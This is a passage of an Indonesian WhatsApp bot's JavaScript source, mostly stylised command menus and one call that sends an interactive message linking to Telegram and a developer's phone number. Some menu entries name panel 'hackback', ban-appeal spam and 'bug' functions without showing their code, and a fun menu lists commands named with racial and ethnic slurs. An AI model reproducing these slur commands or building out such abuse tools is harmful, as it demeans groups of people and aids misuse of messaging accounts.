┃  ❏ ${prefix}ᴄᴏᴜᴘʟᴇᴘᴘ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴇᴋᴏ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴘᴀᴛ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜱʟᴀᴘ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴄᴜᴅᴅʟᴇ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴡᴀɪꜰᴜ
┃  ❏ ${prefix}ᴀɴɪᴍᴇɴᴏᴍ
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴏxɢɪʀʟ
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴛɪᴄᴋʟᴇ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇɢᴇᴄɢ          
┃  ❏ ${prefix}ᴅᴏɢᴡᴏᴏꜰ           
┃  ❏ ${prefix}8ʙᴀʟʟᴘᴏᴏʟ            
┃  ❏ ${prefix}ɢᴏᴏꜱᴇʙɪʀᴅ 
┃  ❏ ${prefix}ᴀɴɪᴍᴇꜰᴇᴇᴅ            
┃  ❏ ${prefix}ᴀɴɪᴍᴇᴀᴠᴀᴛᴀʀ            
┃  ❏ ${prefix}ʟɪᴢᴀʀᴅᴘɪᴄ            
┃  ❏ ${prefix}ᴄᴀᴛᴍᴇᴏᴡ   
┗═━═━═━═━═━═━═━═╴
┏━━━━━━━『 sᴛᴏʀᴇᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴅᴅʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ᴅᴇʟʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ʟɪsᴛʀᴇsᴘᴏɴ
┃  ❏ ${prefix}ᴅᴏɴᴇ
┃  ❏ ${prefix}ᴘʀᴏsᴇs
┃  ❏ ${prefix}ᴊᴘᴍ
┃  ❏ ${prefix}ᴊᴘᴍ2
┃  ❏ ${prefix}ᴊᴘᴍᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴊᴘᴍsʟɪᴅᴇ
┃  ❏ ${prefix}ᴊᴘᴍsʟɪᴅᴇʜᴛ
┃  ❏ ${prefix}ᴊᴘᴍᴄʜ
┃  ❏ ${prefix}ᴊᴘᴍᴄʜғᴏᴛᴏ
┃  ❏ ${prefix}ᴊᴘᴍᴠɪᴅᴇᴏ
┃  ❏ ${prefix}ᴀᴅᴅɪᴅᴄʜ
┃  ❏ ${prefix}ᴅᴇʟɪᴅᴄʜ
┃  ❏ ${prefix}sᴇɴᴅᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ 〕ʙᴜᴛᴛᴏɴ〔
┃  ❏ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋ2
┃  ❏ ${prefix}ᴘᴀʏᴍᴇɴᴛ
┃  ❏ ${prefix}ᴘʀᴏᴅᴜᴋ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴄᴠᴘs
┃  ❏ ${prefix}sɪsᴀᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ᴅᴇʟᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ʟɪsᴛᴅʀᴏᴘʟᴇᴛ
┃  ❏ ${prefix}ʀᴇʙᴜɪʟᴅ
┃  ❏ ${prefix}ʀᴇsᴛᴀʀᴛᴠᴘs
┃  ❏ ${prefix}ᴘɪɴɢ
┃  ❏ ${prefix}ᴜᴘᴛɪᴍᴇ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴘᴀɴᴇʟᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴅᴅsᴇʟʟᴇʀ
┃  ❏ ${prefix}ᴅᴇʟsᴇʟʟᴇʀ
┃  ❏ ${prefix}ʟɪsᴛsᴇʟʟᴇʀ
┃  ❏ ${prefix}1ɢʙ
┃  ❏ ${prefix}2ɢʙ
┃  ❏ ${prefix}3ɢʙ
┃  ❏ ${prefix}4ɢʙ
┃  ❏ ${prefix}5ɢʙ
┃  ❏ ${prefix}6ɢʙ
┃  ❏ ${prefix}7ɢʙ
┃  ❏ ${prefix}8ɢʙ
┃  ❏ ${prefix}9ɢʙ
┃  ❏ ${prefix}10ɢʙ
┃  ❏ ${prefix}ᴜɴʟɪᴍɪᴛᴇᴅ
┃  ❏ ${prefix}ᴄᴀᴅᴍɪɴ
┃  ❏ ${prefix}ᴅᴇʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ᴅᴇʟᴀᴅᴍɪɴ
┃  ❏ ${prefix}ʟɪsᴛᴘᴀɴᴇʟ
┃  ❏ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ 
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ɪɴsᴛᴀʟʟᴇʀᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ʜᴀᴄᴋʙᴀᴄᴋᴘᴀɴᴇʟ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀsᴛᴇʟʟᴀʀ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀʙɪʟʟɪɴɢ
┃  ❏ ${prefix}ɪɴsᴛᴀʟʟᴛᴇᴍᴀᴇɴɪɢᴍᴀ
┃  ❏ ${prefix}ᴜɴɪɴsᴛᴀʟʟᴘᴀɴᴇʟ
┃  ❏ ${prefix}ᴜɴɪɴsᴛᴀʟʟᴛᴇᴍᴀ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 ɢʀᴏᴜᴘᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀɴᴛɪʟɪɴᴋ
┃  ❏ ${prefix}ᴀɴᴛɪʟɪɴᴋ2
┃  ❏ ${prefix}ʙʟᴀᴄᴋʟɪsᴛᴊᴘᴍ
┃  ❏ ${prefix}ᴡᴇʟᴄᴏᴍᴇ
┃  ❏ ${prefix}ᴀᴅᴅ
┃  ❏ ${prefix}ᴋɪᴄᴋ
┃  ❏ ${prefix}ᴄʟᴏsᴇ
┃  ❏ ${prefix}ᴏᴘᴇɴ
┃  ❏ ${prefix}ʜɪᴅᴇᴛᴀɢ
┃  ❏ ${prefix}ᴋᴜᴅᴇᴛᴀɢᴄ
┃  ❏ ${prefix}ʟᴇᴀᴠᴇ
┃  ❏ ${prefix}ᴛᴀɢᴀʟʟ
┃  ❏ ${prefix}ᴘʀᴏᴍᴏᴛᴇ
┃  ❏ ${prefix}ᴅᴇᴍᴏᴛᴇ
┃  ❏ ${prefix}ʀᴇsᴇᴛʟɪɴᴋɢᴄ
┃  ❏ ${prefix}ʟɪɴᴋɢᴄ
┃  ❏ ${prefix}sᴇɴᴅᴛᴇsᴛɪ
┃  ❏ ${prefix}ᴜɴʙʟᴏᴋ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴏᴡɴᴇʀᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀᴜᴛᴏʀᴇᴀᴅ
┃  ❏ ${prefix}ᴀᴜᴛᴏᴘʀᴏᴍᴏsɪ
┃  ❏ ${prefix}ᴀᴜᴛᴏʀᴇᴀᴅsᴡ
┃  ❏ ${prefix}ᴀᴜᴛᴏᴛʏᴘɪɴɢ
┃  ❏ ${prefix}ᴀᴅᴅᴏᴡɴᴇʀ
┃  ❏ ${prefix}ʟɪsᴛᴏᴡɴᴇʀ
┃  ❏ ${prefix}ᴅᴇʟᴏᴡɴᴇʀ
┃  ❏ ${prefix}ᴘʀɪᴠᴀᴛ/ᴘᴜʙʟɪᴄ
┃  ❏ ${prefix}sᴜʙᴅᴏᴍᴀɪɴ
┃  ❏ ${prefix}sᴇᴛɪᴍɢᴍᴇɴᴜ
┃  ❏ ${prefix}sᴇᴛɪᴍɢғᴀᴋᴇ
┃  ❏ ${prefix}sᴇᴛᴘᴘʙᴏᴛ
┃  ❏ ${prefix}ᴄʟᴇᴀʀsᴇssɪᴏɴ
┃  ❏ ${prefix}ᴄʟᴇᴀʀᴄʜᴀᴛ
┃  ❏ ${prefix}ʀᴇsᴇᴛᴅʙ
┃  ❏ ${prefix}ʀᴇsᴛᴀʀᴛʙᴏᴛ
┃  ❏ ${prefix}ɢᴇᴛsᴄ
┃  ❏ ${prefix}ɢᴇᴛᴄᴀsᴇ
┃  ❏ ${prefix}ʟɪsᴛɢᴄ
┃  ❏ ${prefix}ᴊᴏɪɴɢᴄ
┃  ❏ ${prefix}ᴊᴏɪɴᴄʜ
┃  ❏ ${prefix}ᴜᴘᴄʜᴀɴɴᴇʟ
┃  ❏ ${prefix}ᴜᴘᴄʜᴀɴɴᴇʟ2
┃  ❏ ${prefix}ᴀᴍʙɪʟǫ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴛᴇxᴛᴜɴʙᴀɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ3 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ4 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ5 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ6 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ7 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ8 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ9 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ10 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ11 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ12 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ13 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ14 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ15 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ16 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ17 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ18  
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ19 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ20 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴠ21 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ1 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ2 
┃  ❏ ${prefix}ᴛᴇxᴛᴜɴʙᴀɴᴘʀᴇᴍᴠ3
┗═━═━═━═━═━═━═━═━═╴
┏━『 ᴘᴀʏᴍᴇɴᴍᴇɴᴜ ☣︎ 』━━☯
┃  ❏ ${prefix}ᴅᴀɴᴀ
┃  ❏ ${prefix}ᴏᴠᴏ
┃  ❏ ${prefix}ɢᴏᴘᴀʏ
┃  ❏ ${prefix}sʜᴏᴘᴇᴘᴀʏ
╰━━━━━━━━━━━━━━━━━━━☯   `
    await Putzz.sendMessage(m.chat, {
        interactiveMessage: {
            title: menu,
            footer: "LanzOfficial 2026",
            thumbnail: ppmenu,
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    limited_time_offer: {
                        text: "𝐋𝐚𝐧𝐳𝐎𝐟𝐟𝐜𝐢𝐚𝐥'",
                        url: "t.me/Putzzslebew",
                        copy_code: "LanzV6",
                        expiration_time: Date.now() * 999
                    },
                    bottom_sheet: {
                        in_thread_buttons_limit: 2,
                        divider_indices: [1, 2, 3, 4, 5, 999],
                        list_title: "LanzOfficial",
                        button_title: "Click Here "
                    },
                    tap_target_configuration: {
                        title: "▸ X ◂",
                        description: "bomboclard",
                        canonical_url: "https://t.me/LanzOfficial",
                        domain: "shop.example.com",
                        button_index: 0
                    }
                }),
                buttons: [
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "call_permission_request",
                        buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                    },
                    {
                        name: "single_select",
                        buttonParamsJson: JSON.stringify({
                            title: "Mikasa MD",
                            sections: [
                                {
                                    title: "# X - the best",
                                    highlight_label: "ALLMENU",
                                    rows: [
                                        {
                                            title: "lanzOffcial'", 
                                            description: "ᴘᴀᴊᴀɴɢᴀɴ",
                                            id: "lok"
                                        },
                                        { 
                                            title: "@⃟⃟⃟buggs",
                                            description: "ᴘᴀᴊᴀɴɢᴀɴ ᴅᴜʟᴜ",
                                            id: "lok"
                                        }, 
                                                  
                                    ]
                                }
                            ],
                            has_multiple_buttons: true
                        })
                    },
                    {
                 name: "cta_url",
                 buttonParamsJson: JSON.stringify({
                   display_text: "Contack Dev",
                   url: "https://wa.me/6287862058684",
                   merchant_url: "https://wa.me/6287862058684"
                 })
               }, 
                    {
                        name: "cta_copy",
                        buttonParamsJson: JSON.stringify({
                            display_text: "entahlah🗿",
                            id: "123456789",
                            copy_code: "https://t.me/Putzzslebew"
                        })
                    },
                    {
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                            display_text: "credit",
                            id: `${prefix}sc`
                        })
                    }
                ]
            }
        }
    }, { quoted: qtoko });
    
}
break
case "menuacll":
case "allmengu": {
let teks = `⏤͟͟͞͞╳─ *[ \`ʙᴏᴛ - ɪɴғᴏ\` ]* ─ᯤ
> ♞︱ *ᴄʀᴇᴀᴛᴏʀ:* ${namaOwner}
> ♞︱ *ɴᴀᴍᴀ ʙᴏᴛ:* ${botname}
> ♞︱ *ᴠᴇʀsɪ:* \`${versi}\`
> ♞︱ *ᴛᴏᴛᴀʟ ғɪᴛᴜʀ:* ${totalFitur()}
> ♞︱ *ᴛʏᴘᴇ:* ᴄᴀsᴇ

⏤͟͟͞͞╳─ [ \`ᴜsᴇʀ - ɪɴғᴏ\` ] ─ᯤ
> *║◦ɴᴀᴍᴀ:* ${m.pushName}
> *║◦ᴀᴄᴄᴇss:* ${isCreator ? 'ᴏᴡɴᴇʀ' : isPremium ? 'ᴘʀᴇᴍɪᴜᴍ' : 'ғʀᴇᴇ'}
> *║◦ɴᴜᴍʙᴇʀ:* ${m.sender.split('@')[0]}

${readmore}
╭━┉═━━[ ᴘᴜᴛᴢᴢ ʙᴏᴛ ]
┃  ❏ ${prefix}ᴄᴇᴋɪᴅᴄʜ
┃  ❏ ${prefix}ᴄᴇᴋɪᴅɢᴄ
┃  ❏ ${prefix}ǫᴄ
┃  ❏ ${prefix}ʙʀᴀᴛ
┃  ❏ ${prefix}ʙʀᴀᴛᴠɪᴅ
┃  ❏ ${prefix}ᴛᴛᴘ
┃  ❏ ${prefix}ᴛᴛᴘ2
┃  ❏ ${prefix}ᴀᴛᴛᴘ
┃  ❏ ${prefix}ᴀᴛᴛᴘ2
┃  ❏ ${prefix}ʀᴇᴀᴅᴠɪᴇᴡᴏɴᴄᴇ
┃  ❏ ${prefix}sᴛɪᴄᴋᴇʀᴡᴍ
┃  ❏ ${prefix}sᴛɪᴄᴋᴇʀ
┃  ❏ ${prefix}sᴍᴇᴍᴇ
┃  ❏ ${prefix}ᴛᴏɪᴍɢ
┃  ❏ ${prefix}ғᴀᴋᴇᴋᴛᴘ
┃ 🥳 .ᴀᴘᴋǫʀɪs
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 sᴇᴀʀᴄʜᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ʏᴛs
┃  ❏ ${prefix}ᴀᴘᴋᴍᴏᴅ
┃  ❏ ${prefix}ᴘɪɴᴛᴇʀᴇsᴛ
┃  ❏ ${prefix}ɢɪᴍᴀɢᴇ  
┃  ❏ ${prefix}sғɪʟᴇ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 ᴛᴏᴏʟsᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴀɪ
┃  ❏ ${prefix}ɢᴘᴛ
┃  ❏ ${prefix}ᴛᴏᴜʀʟ
┃  ❏ ${prefix}ᴛᴏᴜʀʟ2
┃  ❏ ${prefix}ᴛᴏᴜʀʟ3
┃  ❏ ${prefix}ssᴡᴇʙ
┃  ❏ ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ
┃  ❏ ${prefix}ᴛᴏʜᴅ
┃  ❏ ${prefix}sʜᴏʀᴛʟɪɴᴋ
┃  ❏ ${prefix}sʜᴏʀᴛʟɪɴᴋ2
┃  ❏ ${prefix}ᴇɴᴄ
┃  ❏ ${prefix}ᴇɴᴄʜᴀʀᴅ
┗═━═━═━═━═━═━═━═━═━═━
┏━━━━━『 Shopmenu ☣︎ 』
┃  ❏ ${prefix}ʙᴜʏᴘᴀɴᴇʟ
┃  ❏ ${prefix}ʙᴜʏᴀᴅᴘ
┃  ❏ ${prefix}ʙᴜʏsᴄʀɪᴘᴛ
┃  ❏ ${prefix}ʙᴜʏᴠᴘs
┗═━═━═━═━═━═━═━═━═━═━
┏━━━『 ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ ☣︎ 』
┃  ❏ ${prefix}ᴛɪᴋᴛᴏᴋ
┃  ❏ ${prefix}ᴛɪᴋᴛᴏᴋᴍᴘ3
┃  ❏ ${prefix}ғᴀᴄᴇʙᴏᴏᴋ
┃  ❏ ${prefix}ᴄᴀᴘᴄᴜᴛ
┃  ❏ ${prefix}ɪɴsᴛᴀɢʀᴀᴍ
┃  ❏ ${prefix}ʏᴛᴍᴘ3
┃  ❏ ${prefix}ʏᴛᴍᴘ4
┃  ❏ ${prefix}ᴘʟᴀʏ
┃  ❏ ${prefix}ᴘʟᴀʏᴠɪᴅ
┃  ❏ ${prefix}ɢɪᴛᴄʟᴏɴᴇ
┃  ❏ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ
┗═━═━═━═━═━═━═━═━═╴
┏━━━━━━━『 ғᴜɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ 
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀᴋᴀʜ  
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ 
┃  ❏ ${prefix}ʙɪꜱᴀᴋᴀʜ 
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴄᴇᴋ 
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ 
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ 
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋᴄᴇᴋ 
┃  ❏ ${prefix}ᴡᴀɴɢʏ 
┃  ❏ ${prefix}ʀᴀᴛᴇ
┃  ❏ ${prefix}ᴛᴏʟᴏʟ
┃  ❏ ${prefix}ɢᴏʙʟᴏɢ
┃  ❏ ${prefix}ɢᴏʙʟᴏᴋ
┃  ❏ ${prefix}ɪᴅɪᴏᴛ
┃  ❏ ${prefix}ɢᴀʏ
┃  ❏ ${prefix}ᴊᴏᴍᴏᴋ
┃  ❏ ${prefix}ʙᴀᴊɪɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴜɴᴀꜰɪᴋ
┃  ❏ ${prefix}ᴋᴏɴᴛᴏʟ
┃  ❏ ${prefix}ʏᴀᴛɪᴍ
┃  ❏ ${prefix}ᴘᴏᴋᴇ
┃  ❏ ${prefix}ᴘᴇᴍʙᴏᴋᴇᴘ
┃  ❏ ${prefix}ʜɪᴛᴀᴍ
┃  ❏ ${prefix}ᴊᴀᴡᴀ
┃  ❏ ${prefix}ᴡɪʙᴜ
┃  ❏ ${prefix}ꜱᴛʀᴇꜱꜱ
┃  ❏ ${prefix}ᴍɪꜱᴋɪɴ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋ
┃  ❏ ${prefix}ᴍᴀɴɪꜱ
┃  ❏ ${prefix}ʙᴀʙɪ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢ
┃  ❏ ${prefix}ᴄɪɴᴀ
┃  ❏ ${prefix}ᴀᴛʜᴇɪꜱ
┃  ❏ ${prefix}ᴘᴀᴘᴜᴀ
┃  ❏ ${prefix}ɴɪɢɢᴀ
┃  ❏ ${prefix}ᴘᴇɴɢᴇɴᴛᴏᴛ
┃  ❏ ${prefix}ꜱᴇᴋꜱɪ
┃  ❏ ${prefix}ᴋᴀᴡᴀɪ
┃  ❏ ${prefix}ᴛᴇʀᴄɪɴᴅᴏ
┃  ❏ ${prefix}ꜰᴇᴍʙᴏᴋᴇꜰ
┃  ❏ ${prefix}ᴘᴇɴɢᴏᴄᴏᴋ
┃  ❏ ${prefix}ᴄᴀʙᴜʟ
┃  ❏ ${prefix}ꜰᴜᴄᴋʙᴏʏ
┃  ❏ ${prefix}ᴘʟᴀʏʙᴏʏ
┃  ❏ ${prefix}ꜱᴀɴɢᴇ
┃  ❏ ${prefix}ꜱᴀɴɢᴇᴀɴ
┃  ❏ ${prefix}ʜᴏᴛ
┃  ❏ ${prefix}ᴀᴘᴀᴋᴀʜ
┃  ❏ ${prefix}ʙᴀɢᴀɪᴍᴀɴᴀ
┃  ❏ ${prefix}ʙɪsᴀᴋᴀʜ
┃  ❏ ${prefix}ɢᴀɴᴛᴇɴɢᴄᴇᴋ
┃  ❏ ${prefix}ᴄᴀɴᴛɪᴋᴄᴇᴋ
┃  ❏ ${prefix}ʜɪᴛᴀᴍᴄᴇᴋ
┃  ❏ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ
┃  ❏ ${prefix}ᴍᴀʀᴀʜɪʀɪᴘᴇʀ
┃  ❏ ${prefix}ᴡᴀɴɢʏ
┃  ❏ ${prefix}sᴀɴɢᴇᴄᴇᴋ
┗═━═━═━═━═━═━═━═━═━═╴
┏━━━━━『 ᴘʀɪᴍʙᴏɴᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
┃  ❏ ${prefix}ᴀʀᴛɪɴᴀᴍᴀ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴊᴏᴅᴏʜʙᴀʟɪ
┃  ❏ ${prefix}ꜱᴜᴀᴍɪɪꜱᴛʀɪ
┃  ❏ ${prefix}ʀᴀᴍᴀʟᴄɪɴᴛᴀ
┃  ❏ ${prefix}ᴄᴏᴄᴏᴋɴᴀᴍᴀ
┃  ❏ ${prefix}ᴘᴀꜱᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴊᴀᴅɪᴀɴɴɪᴋᴀʜ
┃  ❏ ${prefix}ꜱɪꜰᴀᴛᴜꜱᴀʜᴀ
┃  ❏ ${prefix}ʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇᴋᴇʀᴊᴀᴀɴ
┃  ❏ ${prefix}ɴᴀꜱɪʙ
┃  ❏ ${prefix}ᴘᴇɴʏᴀᴋɪᴛ
┃  ❏ ${prefix}ᴛᴀʀᴏᴛ
┃  ❏ ${prefix}ꜰᴇɴɢꜱʜᴜɪ
┃  ❏ ${prefix}ʜᴀʀɪʙᴀɪᴋ
┃  ❏ ${prefix}ʜᴀʀɪꜱᴀɴɢᴀʀ
┃  ❏ ${prefix}ʜᴀʀɪꜱɪᴀʟ
┃  ❏ ${prefix}ɴᴀɢᴀʜᴀʀɪ
┃  ❏ ${prefix}ᴀʀᴀʜʀᴇᴢᴇᴋɪ
┃  ❏ ${prefix}ᴘᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴡᴇᴛᴏɴ
┃  ❏ ${prefix}ᴋᴀʀᴀᴋᴛᴇʀ
┃  ❏ ${prefix}ᴋᴇʙᴇʀᴜɴᴛᴜɴɢᴀɴ
┃  ❏ ${prefix}ᴍᴇᴍᴀɴᴄɪɴɢ
┃  ❏ ${prefix}ᴍᴀꜱᴀꜱᴜʙᴜʀ
┃  ❏ ${prefix}ᴢᴏᴅɪᴀᴋ
┃  ❏ ${prefix}ꜱʜɪᴏ
┗═━═━═━═━═━═━═━═━═━
┏━━━━『 ᴄᴇʀᴘᴇɴ ᴍᴇɴᴜ 』
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴅᴀᴇʀᴀʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀɪɴɢɢʀɪꜱ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀᴊᴀᴡᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴀʜᴀꜱᴀꜱᴜɴᴅᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀɪꜱʟᴀᴍɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀᴘᴇʀᴛᴀᴍᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀʀᴏᴍᴀɴᴛɪꜱ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴅɪʜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇɢɪᴛɪɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀꜱᴇᴊᴀᴛɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋɪꜱᴀʜɴʏᴀᴛᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴀᴛᴀʜʜᴀᴛɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴀʟᴀᴍᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ
┃  ❏ ${prefix}ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ
